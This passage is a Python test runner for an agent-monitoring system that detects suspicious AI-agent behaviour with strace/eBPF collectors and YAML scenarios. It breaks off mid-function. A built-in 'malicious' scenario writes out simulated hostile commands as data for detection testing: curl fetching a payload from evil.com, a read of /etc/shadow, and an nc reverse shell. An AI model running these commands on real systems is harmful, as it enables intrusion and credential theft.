#!/usr/bin/env python3
"""
test.py — 方寸观察者模拟学习系统 统一测试入口

用法:
    python test.py                   # 交互式菜单
    python test.py --all             # 运行全部可用测试
    python test.py --unit            # 仅单元测试
    python test.py --integration     # 仅集成测试
    python test.py --scenario        # 仅场景测试（simulation 模式）
    python test.py --e2e             # 仅端到端测试（需 root）
    python test.py --web             # Web API/SSE 测试（需启动 app.py）
    python test.py --list            # 列出所有测试分类及状态
    python test.py --check           # 仅检测环境能力

输出:
    output/test_report/   — 每次运行的汇总报告
"""

import os
import sys
import argparse
import subprocess
import json
import shutil
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Optional

# ── 路径常量 ────────────────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# 项目根目录 = test.py 所在目录
PROJECT_ROOT = SCRIPT_DIR
# 代码包目录 = project_root/observer_sim/
OBSERVER_DIR = os.path.join(PROJECT_ROOT, "observer_sim")
TESTS_DIR = os.path.join(OBSERVER_DIR, "tests")
SUDO_TEST_DIR = os.path.join(PROJECT_ROOT, "sudo_test")
OUTPUT_DIR = os.path.join(OBSERVER_DIR, "output", "test_report")
SCENARIOS_DIR = os.path.join(OBSERVER_DIR, "scenarios")
RECORDS_DIR = os.path.join(PROJECT_ROOT, "records")


# ── 环境检测 ────────────────────────────────────────────────────────────────
@dataclass
class EnvCapabilities:
    is_root: bool = False
    has_strace: bool = False
    has_ebpf: bool = False
    has_btf: bool = False
    has_libbpf: bool = False
    python3: str = ""
    app_running: bool = False

    def detect(self):
        self.python3 = sys.executable
        self.is_root = os.geteuid() == 0
        self.has_strace = shutil.which("strace") is not None
        self.has_btf = os.path.exists("/sys/kernel/btf/vmlinux")
        # 检测 libbpf
        try:
            import ctypes
            for lib in ["libbpf.so", "/usr/local/lib/libbpf.so", "libbpf.so.1"]:
                try:
                    ctypes.CDLL(lib)
                    self.has_libbpf = True
                    break
                except OSError:
                    continue
        except Exception:
            pass
        self.has_ebpf = self.has_btf and self.has_libbpf
        # 检测 app.py 是否在运行
        try:
            import urllib.request
            urllib.request.urlopen("http://localhost:8080/api/health", timeout=1)
            self.app_running = True
        except Exception:
            pass

    def summary(self) -> List[str]:
        lines = []
        lines.append(f"  Python:    {self.python3}")
        lines.append(f"  Root:      {'✅ 是' if self.is_root else '❌ 否（e2e 测试将跳过）'}")
        lines.append(f"  strace:    {'✅ 可用' if self.has_strace else '❌ 未安装'}")
        lines.append(f"  BTF:       {'✅ 支持' if self.has_btf else '❌ 不支持'}")
        lines.append(f"  libbpf:    {'✅ 可用' if self.has_libbpf else '❌ 未安装'}")
        lines.append(f"  eBPF:      {'✅ 完整可用' if self.has_ebpf else '⚠️  不可用（eBPF 测试将跳过）'}")
        lines.append(f"  Web App:   {'✅ 运行中' if self.app_running else '❌ 未运行（web 测试将跳过）'}")
        return lines


# ── 测试分类定义 ─────────────────────────────────────────────────────────────
@dataclass
class TestCategory:
    name: str
    label: str
    description: str
    files: List[str]
    requires_root: bool = False
    requires_ebpf: bool = False
    requires_strace: bool = False
    requires_web: bool = False
    run_type: str = "pytest"  # pytest | script | scenario | web_script


def get_categories() -> List[TestCategory]:
    return [
        TestCategory(
            name="unit",
            label="单元测试",
            description="核心模块的独立单元验证（无需 root/eBPF）",
            files=[
                "test_monitoring.py",
                "test_judgment.py",
                "test_blocking.py",
                "test_audit.py",
                "test_pipe_communication.py",
                "test_virtual_clock.py",
                "test_adapter.py",
            ],
        ),
        TestCategory(
            name="collector",
            label="采集器测试",
            description="各采集器（simulation/strace/ebpf/file_replay）的单元测试",
            files=[
                "test_simulation_collector.py",
                "test_ebpf_collector.py",
                "test_ebpf_field_mapping.py",
                "test_ebpf_edge_cases.py",
                "test_ebpf_performance.py",
                "test_strace_collector.py",
                "test_file_replay_collector.py",
            ],
        ),
        TestCategory(
            name="integration",
            label="集成测试",
            description="多模块协作、全链路 Pipeline 验证",
            files=[
                "test_integration.py",
                "test_collector_integration.py",
            ],
        ),
        TestCategory(
            name="scenario",
            label="场景测试",
            description="YAML 场景驱动的 simulation 模式回放验证（37 个场景）",
            files=[],
            run_type="scenario",
        ),
        TestCategory(
            name="e2e",
            label="端到端测试",
            description="高权限真实 strace/eBPF 环境验证（需 root）",
            files=[],
            requires_root=True,
            run_type="script",
        ),
        TestCategory(
            name="web",
            label="Web API 测试",
            description="Web API + SSE 推送验证（需启动 app.py）",
            files=["test_api.py", "test_sse.py"],
            requires_web=True,
            run_type="web_script",
        ),
    ]


# ── 运行器 ──────────────────────────────────────────────────────────────────
@dataclass
class TestResult:
    category: str
    passed: int = 0
    failed: int = 0
    skipped: int = 0
    error: str = ""
    duration_s: float = 0.0

    @property
    def total(self):
        return self.passed + self.failed + self.skipped


def run_pytest(files: List[str], env: EnvCapabilities, extra_args: List[str] = None) -> TestResult:
    """运行一组 pytest 测试文件"""
    cat_name = os.path.basename(files[0]) if files else "unknown"
    paths = [os.path.join(TESTS_DIR, f) for f in files if os.path.exists(os.path.join(TESTS_DIR, f))]
    # 也检查 observer_sim/ 根目录下的文件
    for f in files:
        p = os.path.join(OBSERVER_DIR, f)
        if os.path.exists(p) and p not in paths:
            paths.append(p)

    if not paths:
        return TestResult(category=cat_name, error="无可用测试文件")

    cmd = [env.python3, "-m", "pytest", "--tb=line",
           f"--override-ini=cache_dir=/tmp/pytest_cache_observer"] + paths
    if extra_args:
        cmd.extend(extra_args)

    t0 = datetime.now()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True,
                                cwd=OBSERVER_DIR, timeout=300,
                                env={**os.environ, "PYTHONUNBUFFERED": "1"})
        duration = (datetime.now() - t0).total_seconds()
        output = result.stdout + result.stderr

        passed = 0
        failed = 0
        skipped = 0

        # 优先从 conftest.py 写入的 JSON 中读取（检查最新写入的文件）
        json_candidates = [
            os.path.join("/tmp", "observer_unit_test", "test_results.json"),
            os.path.join(OBSERVER_DIR, "output", "unit_test", "test_results.json"),
        ]
        # 选择最近修改的 JSON 文件
        best_path = None
        best_mtime = 0
        for jp in json_candidates:
            if os.path.exists(jp):
                mt = os.path.getmtime(jp)
                if mt > best_mtime:
                    best_mtime = mt
                    best_path = jp

        if best_path:
            try:
                with open(best_path) as jf:
                    data = json.load(jf)
                passed = data.get("passed", 0)
                failed = data.get("failed", 0)
                skipped = data.get("skipped", 0)
            except (json.JSONDecodeError, KeyError):
                pass

        # 回退: 从 pytest 输出解析
        if passed + failed + skipped == 0:
            import re
            for line in output.split("\n"):
                m = re.search(r'(\d+) passed', line)
                if m:
                    passed = int(m.group(1))
                m = re.search(r'(\d+) failed', line)
                if m:
                    failed = int(m.group(1))
                m = re.search(r'(\d+) skipped', line)
                if m:
                    skipped = int(m.group(1))

        # 如果仍为 0，从逐行输出计数
        if passed + failed + skipped == 0:
            for line in output.split("\n"):
                if "PASSED" in line:
                    passed += 1
                elif "FAILED" in line:
                    failed += 1
                elif "SKIPPED" in line:
                    skipped += 1

        return TestResult(category=cat_name, passed=passed, failed=failed,
                          skipped=skipped, duration_s=duration)
    except subprocess.TimeoutExpired:
        return TestResult(category=cat_name, error="超时(300s)")
    except Exception as e:
        return TestResult(category=cat_name, error=str(e))


def run_scenario_tests(env: EnvCapabilities, scenario_filter: str = "") -> TestResult:
    """运行 YAML 场景测试（simulation 模式）"""
    main_py = os.path.join(OBSERVER_DIR, "main.py")
    if not os.path.exists(main_py):
        return TestResult(category="scenario", error="main.py 不存在")

    # 收集场景
    categories = ["normal", "anomalous", "boundary", "multi_agent", "extreme"]
    all_scenarios = []
    for cat in categories:
        cat_dir = os.path.join(SCENARIOS_DIR, cat)
        if os.path.isdir(cat_dir):
            for f in sorted(os.listdir(cat_dir)):
                if f.endswith(".yaml"):
                    sid = f.replace(".yaml", "")
                    if not scenario_filter or scenario_filter in sid:
                        all_scenarios.append((cat, sid))

    if not all_scenarios:
        return TestResult(category="scenario", error="无场景文件")

    passed = 0
    failed = 0
    t0 = datetime.now()

    for cat, sid in all_scenarios:
        cmd = [env.python3, main_py, "--mode", "simulation", "--scenario", sid,
               "--output", os.path.join(OBSERVER_DIR, "output")]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True,
                                    cwd=OBSERVER_DIR, timeout=30,
                                    env={**os.environ, "PYTHONUNBUFFERED": "1"})
            if result.returncode == 0:
                passed += 1
                print(f"    ✅ {cat}/{sid}")
            else:
                failed += 1
                err_snippet = (result.stderr or result.stdout)[:100].strip()
                print(f"    ❌ {cat}/{sid} — {err_snippet}")
        except subprocess.TimeoutExpired:
            failed += 1
            print(f"    ⏰ {cat}/{sid} — 超时")
        except Exception as e:
            failed += 1
            print(f"    ❌ {cat}/{sid} — {e}")

    duration = (datetime.now() - t0).total_seconds()
    return TestResult(category="scenario", passed=passed, failed=failed, duration_s=duration)


def run_e2e_tests(env: EnvCapabilities) -> TestResult:
    """运行高权限端到端测试（sudo_test/run_all.sh）"""
    script = os.path.join(SUDO_TEST_DIR, "run_all.sh")
    if not os.path.exists(script):
        return TestResult(category="e2e", error="run_all.sh 不存在")

    if not env.is_root:
        return TestResult(category="e2e", error="需要 root 权限，跳过", skipped=1)

    t0 = datetime.now()
    try:
        result = subprocess.run(["bash", script], capture_output=True, text=True,
                                cwd=PROJECT_ROOT, timeout=600,
                                env={**os.environ, "PYTHONUNBUFFERED": "1"})
        duration = (datetime.now() - t0).total_seconds()
        output = result.stdout + result.stderr

        passed = output.count("[PASS]")
        failed = output.count("[FAIL]")
        skipped = output.count("[SKIP]")

        return TestResult(category="e2e", passed=passed, failed=failed,
                          skipped=skipped, duration_s=duration)
    except subprocess.TimeoutExpired:
        return TestResult(category="e2e", error="超时(600s)")
    except Exception as e:
        return TestResult(category="e2e", error=str(e))


def run_web_tests(env: EnvCapabilities) -> TestResult:
    """运行 Web API/SSE 测试"""
    if not env.app_running:
        return TestResult(category="web", error="app.py 未运行（先启动: python app.py）", skipped=1)

    files = ["test_api.py", "test_sse.py"]
    paths = [os.path.join(OBSERVER_DIR, f) for f in files if os.path.exists(os.path.join(OBSERVER_DIR, f))]
    if not paths:
        return TestResult(category="web", error="测试脚本不存在")

    import re
    t0 = datetime.now()
    passed = 0
    failed = 0
    for p in paths:
        try:
            result = subprocess.run([env.python3, p], capture_output=True, text=True,
                                    cwd=OBSERVER_DIR, timeout=60)
            output = result.stdout + result.stderr

            # 优先从脚本的汇总行解析: "=== Results: N passed, M failed ==="
            script_p, script_f = 0, 0
            for line in output.split("\n"):
                m = re.search(r'Results:\s*(\d+)\s*passed,\s*(\d+)\s*failed', line)
                if m:
                    script_p = int(m.group(1))
                    script_f = int(m.group(2))

            if script_p + script_f > 0:
                passed += script_p
                failed += script_f
            else:
                # 回退: 逐行计数（仅匹配独立测试行，排除汇总行）
                for line in output.split("\n"):
                    upper = line.strip().upper()
                    if upper.startswith("PASS:"):
                        passed += 1
                    elif upper.startswith("FAIL:"):
                        failed += 1
        except subprocess.TimeoutExpired:
            failed += 1
        except Exception:
            failed += 1

    duration = (datetime.now() - t0).total_seconds()
    return TestResult(category="web", passed=passed, failed=failed, duration_s=duration)


# ── 报告 ─────────────────────────────────────────────────────────────────────
def write_report(results: List[TestResult]):
    """写入汇总报告到 output/test_report/"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    total_p = sum(r.passed for r in results)
    total_f = sum(r.failed for r in results)
    total_s = sum(r.skipped for r in results)
    total_e = sum(1 for r in results if r.error and r.skipped == 0)

    # 文本报告
    lines = [
        f"{'=' * 70}",
        f"  方寸观察者模拟学习系统 — 测试汇总报告",
        f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"{'=' * 70}",
        "",
        f"  总计: {total_p + total_f + total_s} 项 | "
        f"✅ 通过: {total_p} | ❌ 失败: {total_f} | ⏭️  跳过: {total_s} | ⚠️  错误: {total_e}",
        "",
        f"{'─' * 70}",
    ]

    for r in results:
        if r.error and r.skipped > 0:
            status = "⏭️ "
            lines.append(f"  {status} {r.category:20s} — {r.error}")
        elif r.error:
            status = "⚠️"
            lines.append(f"  {status} {r.category:20s} — {r.error}")
        else:
            status = "✅" if r.failed == 0 else "❌"
            dur = f"{r.duration_s:.1f}s" if r.duration_s else "-"
            lines.append(
                f"  {status} {r.category:20s} | 通过: {r.passed:3d} | "
                f"失败: {r.failed:3d} | 跳过: {r.skipped:3d} | {dur}")

    lines.append(f"{'─' * 70}")
    if total_f == 0 and total_e == 0:
        lines.append("  🎉 全部通过！")
    elif total_f > 0:
        lines.append(f"  ⚠️  有 {total_f} 项失败，请检查上方详情。")
    lines.append("")

    report_text = "\n".join(lines)
    print(report_text)
    txt_path = os.path.join(OUTPUT_DIR, f"report_{ts}.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write(report_text)

    # JSON 报告
    json_data = {
        "timestamp": datetime.now().isoformat(),
        "summary": {"passed": total_p, "failed": total_f, "skipped": total_s, "errors": total_e},
        "categories": [
            {"name": r.category, "passed": r.passed, "failed": r.failed,
             "skipped": r.skipped, "error": r.error, "duration_s": r.duration_s}
            for r in results
        ],
    }
    json_path = os.path.join(OUTPUT_DIR, f"report_{ts}.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(json_data, f, ensure_ascii=False, indent=2)

    # 始终保留 latest 链接
    latest_txt = os.path.join(OUTPUT_DIR, "latest.txt")
    latest_json = os.path.join(OUTPUT_DIR, "latest.json")
    shutil.copy2(txt_path, latest_txt)
    shutil.copy2(json_path, latest_json)

    return total_f == 0 and total_e == 0


# ── 录制-回放状态 ─────────────────────────────────────────────────────────────
_active_recorder = None  # 当前活跃的 SessionRecorder


def _start_recording(env: EnvCapabilities):
    """开始录制会话"""
    global _active_recorder
    if _active_recorder and _active_recorder.is_recording:
        print(f"  !! 已在录制中 (session: {_active_recorder.session_id})")
        return

    sys.path.insert(0, OBSERVER_DIR)
    from recorder.session_recorder import SessionRecorder

    # 选择 agent_id
    agent_id = input("  Agent ID [record-agent]: ").strip() or "record-agent"

    recorder = SessionRecorder(
        records_dir=RECORDS_DIR,
        agent_id=agent_id,
        collect_mode="simulation",
    )
    recorder.start()

    # 在 simulation 模式下，录制内置场景事件
    print(f"\n  Recording started: {recorder.session_id}")
    print(f"  Session dir: {recorder.session_dir}")
    print(f"  Select scenario to record (or 'done' to stop):")
    print(f"    Built-in:  malicious / normal")
    print(f"    DeepAgent: da01 (data analysis)")
    print(f"               da02 (code generation)")
    print(f"               da03 (suspicious behavior)")
    print(f"               da04 (Q3 production demo)")
    print(f"    YAML scenario ID: n01, a01, b03, etc.")

    from models.event import RawEvent
    import yaml

    total_events = 0
    while True:
        choice = input("  Scenario [done]: ").strip()
        if not choice or choice.lower() == "done":
            break

        events = _generate_scenario_events(choice, OBSERVER_DIR, agent_id)
        if not events:
            print(f"  !! Unknown scenario: {choice}")
            continue

        for evt in events:
            recorder.write_event(evt)
            total_events += 1
            desc = _short_event_desc(evt)
            print(f"    [REC {total_events:03d}] {evt.event_type:10s} | {desc}")

    summary = recorder.stop()
    _active_recorder = None

    print(f"\n  Recording stopped:")
    print(f"    Session:   {summary.get('session_id', '')}")
    print(f"    Events:    {summary.get('event_count', 0)}")
    print(f"    Duration:  {summary.get('duration_s', 0):.1f}s")
    print(f"    File:      {summary.get('events_file', '')}")
    print(f"    Meta:      {summary.get('meta_file', '')}")


def _stop_recording():
    """结束录制"""
    global _active_recorder
    if not _active_recorder or not _active_recorder.is_recording:
        print("  !! 当前没有活跃的录制会话")
        return
    summary = _active_recorder.stop()
    _active_recorder = None
    print(f"  Recording stopped: {summary.get('event_count', 0)} events")


def _replay_recording():
    """回放历史录制"""
    sys.path.insert(0, OBSERVER_DIR)
    from recorder.session_recorder import SessionRecorder
    from recorder.replay_engine import ReplayEngine

    recordings = SessionRecorder.list_recordings(RECORDS_DIR)
    if not recordings:
        print("  !! 没有历史录制 (records/ 目录为空)")
        return

    # 显示列表
    print(f"\n  {'No':>3s}  {'Session ID':16s}  {'Events':>6s}  {'Mode':12s}  {'Duration':>8s}  Agent")
    print(f"  {'---':>3s}  {'----------------':16s}  {'------':>6s}  {'------------':12s}  {'--------':>8s}  -----")
    for i, rec in enumerate(recordings, 1):
        dur = f"{float(rec.get('duration_seconds', 0)):.1f}s"
        print(f"  {i:3d}  {str(rec['session_id']):16s}  {int(rec.get('event_count', 0)):6d}  "
              f"{str(rec.get('collect_mode', '')):12s}  {dur:>8s}  {str(rec.get('agent_id', ''))}")

    # 选择
    choice = input(f"\n  Select recording [1-{len(recordings)}]: ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(recordings):
            raise ValueError
    except ValueError:
        print("  !! Invalid selection")
        return

    selected = recordings[idx]
    print(f"\n  Replaying: {selected['session_id']}")

    # 加载 config
    config_path = os.path.join(OBSERVER_DIR, "config.yaml")
    config = {}
    if os.path.isfile(config_path):
        import yaml
        with open(config_path, "r", encoding="utf-8") as f:
            config = yaml.safe_load(f) or {}

    engine = ReplayEngine(config)
    engine.replay(selected["session_dir"])


def _generate_scenario_events(scenario_id: str, observer_dir: str,
                               agent_id: str) -> list:
    """根据场景 ID 生成事件列表"""
    from models.event import RawEvent

    # 内置模拟场景
    if scenario_id == "malicious":
        return _builtin_malicious_events(agent_id)
    elif scenario_id == "normal":
        return _builtin_normal_events(agent_id)

    # 内置 DeepAgent 场景 (pydantic-deep 预设)
    elif scenario_id == "da01":
        return _builtin_da01_events(agent_id)
    elif scenario_id == "da02":
        return _builtin_da02_events(agent_id)
    elif scenario_id == "da03":
        return _builtin_da03_events(agent_id)
    elif scenario_id == "da04":
        return _builtin_da04_events(agent_id)

    # 尝试加载 YAML 场景
    import yaml
    import glob
    yaml_files = glob.glob(
        os.path.join(observer_dir, "scenarios", "**", f"{scenario_id}*.yaml"),
        recursive=True)
    if not yaml_files:
        return []

    events = []
    with open(yaml_files[0], "r", encoding="utf-8") as f:
        sc = yaml.safe_load(f)

    base_ts = 1718092800000000000

    # 检查是否为 deep_agent 格式 (含 tool_calls)
    tool_calls = sc.get("tool_calls", [])
    if tool_calls:
        scenario_meta = sc.get("scenario", {})
        base_ts = scenario_meta.get("base_timestamp_ns", base_ts)
        return _tool_calls_to_events(tool_calls, base_ts, agent_id, scenario_id)

    # 标准场景格式 (含 commands)
    for i, cmd_def in enumerate(sc.get("commands", [])):
        cmd = cmd_def.get("command", "")
        parts = cmd.split()
        exe = parts[0] if parts else cmd
        args = parts[1:] if len(parts) > 1 else []
        events.append(RawEvent(
            event_id=f"sc_{scenario_id}_{i+1:03d}",
            timestamp_ns=base_ts + i * 100_000_000,
            event_type="exec",
            pid=10000 + i, ppid=10000,
            agent_id=agent_id,
            agent_framework="recorded",
            executable=exe, arguments=args,
        ))

    return events


def _tool_calls_to_events(tool_calls: list, base_ts: int,
                           agent_id: str, scenario_id: str) -> list:
    """将 DeepAgent YAML 的 tool_calls 转换为 RawEvent 列表"""
    from models.event import RawEvent

    # 工具名 → 事件类型映射
    _EXEC_TOOLS = {"execute", "execute_command", "run_command", "shell", "bash"}
    _READ_TOOLS = {"read_file", "read", "cat", "list_files", "grep", "glob"}
    _WRITE_TOOLS = {"write_file", "write", "edit_file", "edit", "patch"}
    _NET_TOOLS = {"web_fetch", "fetch", "web_search", "browse", "curl"}

    events = []
    seq = 0
    pid_base = 60000

    for call in tool_calls:
        seq += 1
        tool_name = call.get("tool", "execute")
        tool_input = call.get("input", {})
        delay_ms = call.get("delay_ms", 100)
        ts = base_ts + seq * delay_ms * 1_000_000  # ms → ns

        executable = None
        arguments = None
        file_path = None
        file_op = None
        remote_addr = None
        remote_port = None
        protocol = None
        event_type = "exec"  # default

        if tool_name in _EXEC_TOOLS:
            event_type = "exec"
            cmd = tool_input.get("command", tool_input.get("cmd", tool_name))
            parts = cmd.split() if isinstance(cmd, str) else [str(cmd)]
            executable = parts[0] if parts else tool_name
            arguments = parts

        elif tool_name in _READ_TOOLS:
            event_type = "file_open"
            file_path = (tool_input.get("path")
                         or tool_input.get("file_path")
                         or tool_input.get("file") or "")
            file_op = "read"

        elif tool_name in _WRITE_TOOLS:
            event_type = "file_open"
            file_path = (tool_input.get("path")
                         or tool_input.get("file_path")
                         or tool_input.get("file") or "")
            file_op = "write"

        elif tool_name in _NET_TOOLS:
            event_type = "net_conn"
            url = (tool_input.get("url") or tool_input.get("query") or "")
            remote_addr = _extract_host(url)
            remote_port = 443
            protocol = "TCP"

        else:
            # 未知工具 → exec
            event_type = "exec"
            cmd = tool_input.get("command", tool_name)
            parts = cmd.split() if isinstance(cmd, str) else [str(cmd)]
            executable = parts[0] if parts else tool_name
            arguments = parts

        events.append(RawEvent(
            event_id=f"da_{scenario_id}_{seq:03d}",
            timestamp_ns=ts,
            event_type=event_type,
            pid=pid_base + seq, ppid=pid_base,
            agent_id=agent_id,
            agent_framework="pydantic-deep-sim",
            executable=executable,
            arguments=arguments,
            file_path=file_path,
            file_op=file_op,
            remote_addr=remote_addr,
            remote_port=remote_port,
            protocol=protocol,
        ))

    return events


def _extract_host(url: str) -> str:
    """从 URL 提取主机地址"""
    if not url:
        return "unknown"
    host = url
    for prefix in ("https://", "http://", "ftp://"):
        if host.startswith(prefix):
            host = host[len(prefix):]
            break
    host = host.split("/")[0].split("?")[0].split(":")[0]
    return host or "unknown"


def _builtin_malicious_events(agent_id: str) -> list:
    """内置恶意场景事件"""
    from models.event import RawEvent
    base = 1718092800000000000
    return [
        RawEvent(event_id="m01", timestamp_ns=base, event_type="exec",
                 pid=50001, ppid=50000, agent_id=agent_id,
                 agent_framework="recorded",
                 executable="/usr/bin/curl",
                 arguments=["curl", "-s", "https://evil.com/payload.sh"]),
        RawEvent(event_id="m02", timestamp_ns=base+100_000_000,
                 event_type="net_conn", pid=50001, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 remote_addr="192.168.1.100", remote_port=443, protocol="TCP"),
        RawEvent(event_id="m03", timestamp_ns=base+200_000_000,
                 event_type="file_open", pid=50001, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 file_path="/tmp/payload.sh", file_op="write"),
        RawEvent(event_id="m04", timestamp_ns=base+300_000_000,
                 event_type="exec", pid=50002, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 executable="/bin/bash",
                 arguments=["bash", "/tmp/payload.sh"]),
        RawEvent(event_id="m05", timestamp_ns=base+400_000_000,
                 event_type="file_open", pid=50002, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 file_path="/etc/shadow", file_op="read"),
        RawEvent(event_id="m06", timestamp_ns=base+500_000_000,
                 event_type="net_conn", pid=50002, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 remote_addr="10.0.0.99", remote_port=4444, protocol="TCP"),
        RawEvent(event_id="m07", timestamp_ns=base+600_000_000,
                 event_type="exec", pid=50003, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 executable="/usr/bin/nc",
                 arguments=["nc", "-e", "/bin/sh", "10.0.0.99", "4444"]),
    ]


def _builtin_da01_events(agent_id: str) -> list:
    """DeepAgent 场景 da01: 数据分析助手 (8 events, 全部 ALLOW)"""
    return _load_deep_agent_scenario("da01_data_analysis", agent_id)


def _builtin_da02_events(agent_id: str) -> list:
    """DeepAgent 场景 da02: 代码生成与测试 (11 events, 全部 ALLOW)"""
    return _load_deep_agent_scenario("da02_code_generation", agent_id)


def _builtin_da03_events(agent_id: str) -> list:
    """DeepAgent 场景 da03: 可疑 Agent 行为 (10 events, 触发 ALERT/BLOCK)"""
    return _load_deep_agent_scenario("da03_suspicious_behavior", agent_id)


def _builtin_da04_events(agent_id: str) -> list:
    """DeepAgent 场景 da04: Q3 商业报表分析 (17 events, 生产演示 ALLOW/ALERT/BLOCK)"""
    return _load_deep_agent_scenario("da04_production_demo", agent_id)


def _load_deep_agent_scenario(scenario_name: str, agent_id: str) -> list:
    """加载 DeepAgent YAML 场景并转换为事件列表"""
    import yaml
    scenario_path = os.path.join(
        OBSERVER_DIR, "scenarios", "deep_agent", f"{scenario_name}.yaml")
    if not os.path.isfile(scenario_path):
        print(f"  !! DeepAgent 场景文件不存在: {scenario_path}")
        return []

    with open(scenario_path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)

    tool_calls = data.get("tool_calls", [])
    if not tool_calls:
        return []

    scenario_meta = data.get("scenario", {})
    base_ts = scenario_meta.get("base_timestamp_ns", 1718092800000000000)
    scenario_id = scenario_meta.get("id", scenario_name[:4])
    return _tool_calls_to_events(tool_calls, base_ts, agent_id, scenario_id)


def _builtin_normal_events(agent_id: str) -> list:
    """内置正常场景事件"""
    from models.event import RawEvent
    base = 1718092800000000000
    return [
        RawEvent(event_id="n01", timestamp_ns=base, event_type="exec",
                 pid=60001, ppid=60000, agent_id=agent_id,
                 agent_framework="recorded",
                 executable="/usr/bin/gcc",
                 arguments=["gcc", "-o", "main", "main.c"]),
        RawEvent(event_id="n02", timestamp_ns=base+100_000_000,
                 event_type="file_open", pid=60001, ppid=60000,
                 agent_id=agent_id, agent_framework="recorded",
                 file_path="/home/dev/project/main.c", file_op="read"),
        RawEvent(event_id="n03", timestamp_ns=base+300_000_000,
                 event_type="exec", pid=60002, ppid=60000,
                 agent_id=agent_id, agent_framework="recorded",
                 executable="/usr/bin/git",
                 arguments=["git", "commit", "-m", "fix bug"]),
        RawEvent(event_id="n04", timestamp_ns=base+400_000_000,
                 event_type="net_conn", pid=60002, ppid=60000,
                 agent_id=agent_id, agent_framework="recorded",
                 remote_addr="140.82.121.4", remote_port=443, protocol="TCP"),
    ]


def _short_event_desc(event) -> str:
    """事件简短描述"""
    et = event.event_type
    if et == "exec":
        exe = event.executable or ""
        args = " ".join(event.arguments or [])
        return f"{exe} {args}".strip()[:60]
    elif et == "file_open":
        return f"{event.file_op or 'open'} {event.file_path or ''}"
    elif et == "net_conn":
        return f"{event.remote_addr or ''}:{event.remote_port or ''}"
    return et


# ── 交互式菜单 ──────────────────────────────────────────────────────────────
def interactive_menu(env: EnvCapabilities, categories: List[TestCategory]):
    """交互式菜单选择"""
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print("║   方寸观察者模拟学习系统 — 统一测试入口                  ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║                                                          ║")
    print("║  环境能力:                                               ║")
    for line in env.summary():
        print(f"║    {line:<54s} ║")
    print("║                                                          ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║                                                          ║")
    print("║  [1] 单元测试        — 核心模块独立验证                   ║")
    print("║  [2] 采集器测试      — simulation/strace/ebpf/replay      ║")
    print("║  [3] 集成测试        — 多模块协作 Pipeline 验证           ║")
    print("║  [4] 场景测试        — 37 个 YAML 场景回放 (simulation)   ║")
    print("║  [5] 端到端测试      — 真实 strace/eBPF (需 root)         ║")
    print("║  [6] Web API 测试    — API + SSE 验证 (需启动 app.py)     ║")
    print("║  [7] 全部运行        — 自动跳过不可用项                   ║")
    print("║  [8] 环境检测        — 仅显示环境能力                     ║")
    print("║  [9] * 开始录制      — 启动事件流录制                     ║")
    rec_status = "active" if (_active_recorder and _active_recorder.is_recording) else ""
    stop_label = f"— {'[' + rec_status + '] 停止录制并保存':<37s} ║" if rec_status else "— 停止录制并保存文件                               ║"
    print(f"║  [A] + 结束录制     {stop_label}")
    print("║  [B] < 回放录制      — 选择历史录制并回放分析             ║")
    print("║  [0] 退出                                                  ║")
    print("║                                                          ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print()

    choice = input("请选择 [0-9/A/B]: ").strip().upper()
    all_names = ["unit", "collector", "integration", "scenario", "e2e", "web"]
    mapping = {
        "1": ["unit"], "2": ["collector"], "3": ["integration"],
        "4": ["scenario"], "5": ["e2e"], "6": ["web"],
        "7": all_names, "8": ["check"],
        "9": ["record"], "A": ["stop_record"], "B": ["replay"],
    }
    return mapping.get(choice, [])


# ── 主逻辑 ──────────────────────────────────────────────────────────────────
def run_selected(names: List[str], env: EnvCapabilities, categories: List[TestCategory]) -> bool:
    """运行选定的测试分类，返回是否全部通过"""
    results: List[TestResult] = []

    for name in names:
        # 录制-回放特殊处理
        if name == "record":
            _start_recording(env)
            continue
        if name == "stop_record":
            _stop_recording()
            continue
        if name == "replay":
            _replay_recording()
            continue

        cat = next((c for c in categories if c.name == name), None)
        if not cat:
            continue

        print(f"\n{'─' * 60}")
        print(f"  ▶ {cat.label} — {cat.description}")
        print(f"{'─' * 60}")

        # 检查前置条件
        if cat.requires_root and not env.is_root:
            print(f"  ⏭️  跳过: 需要 root 权限")
            results.append(TestResult(category=cat.label, skipped=1, error="需要 root 权限"))
            continue
        if cat.requires_ebpf and not env.has_ebpf:
            print(f"  ⏭️  跳过: 需要 eBPF 支持")
            results.append(TestResult(category=cat.label, skipped=1, error="需要 eBPF 支持"))
            continue
        if cat.requires_web and not env.app_running:
            print(f"  ⏭️  跳过: 需要先启动 app.py")
            results.append(TestResult(category=cat.label, skipped=1, error="app.py 未运行"))
            continue

        # 按运行类型分发
        if cat.run_type == "pytest":
            r = run_pytest(cat.files, env)
            r.category = cat.label
            results.append(r)
        elif cat.run_type == "scenario":
            r = run_scenario_tests(env)
            r.category = cat.label
            results.append(r)
        elif cat.run_type == "script":
            r = run_e2e_tests(env)
            r.category = cat.label
            results.append(r)
        elif cat.run_type == "web_script":
            r = run_web_tests(env)
            r.category = cat.label
            results.append(r)

    return write_report(results)


def list_tests(env: EnvCapabilities, categories: List[TestCategory]):
    """列出所有测试分类及其状态"""
    print(f"\n{'=' * 70}")
    print(f"  测试分类清单")
    print(f"{'=' * 70}")
    for cat in categories:
        available = True
        skip_reason = ""
        if cat.requires_root and not env.is_root:
            available = False
            skip_reason = " (需 root)"
